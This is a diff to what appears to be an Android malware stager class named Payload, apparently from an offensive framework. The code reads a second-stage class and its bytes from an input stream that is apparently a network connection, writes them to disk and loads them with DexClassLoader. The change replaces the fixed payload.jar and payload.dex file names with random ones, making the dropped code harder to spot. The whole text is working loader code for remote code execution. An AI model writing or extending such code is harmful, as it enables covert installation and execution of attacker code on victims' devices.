@@ -13,6 +13,7 @@ import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URL;
 import java.net.URLConnection;
+import java.util.Random;
 import java.util.concurrent.TimeUnit;
 
 import dalvik.system.DexClassLoader;
@@ -162,8 +163,9 @@ public class Payload {
             }).newInstance(in, out, parameters, false);
         } catch (ClassNotFoundException e) {
             String path = (String) parameters[0];
-            String filePath = path + File.separatorChar + "payload.jar";
-            String dexPath = path + File.separatorChar + "payload.dex";
+            String filePath = path + File.separatorChar + Integer.toString(new Random().nextInt(Integer.MAX_VALUE), 36);
+            String jarPath = filePath + ".jar";
+            String dexPath = filePath + ".dex";
 
             // Read the class name
             int coreLen = in.readInt();
@@ -176,7 +178,7 @@ public class Payload {
             core = new byte[coreLen];
             in.readFully(core);
 
-            File file = new File(filePath);
+            File file = new File(jarPath);
             if (!file.exists()) {
                 file.createNewFile();
             }
@@ -186,7 +188,7 @@ public class Payload {
             fop.close();
 
             // Load the stage
-            DexClassLoader classLoader = new DexClassLoader(filePath, path, path,
+            DexClassLoader classLoader = new DexClassLoader(jarPath, path, path,
                     Payload.class.getClassLoader());
             Class<?> myClass = classLoader.loadClass(classFile);
             final Object stage = myClass.newInstance();
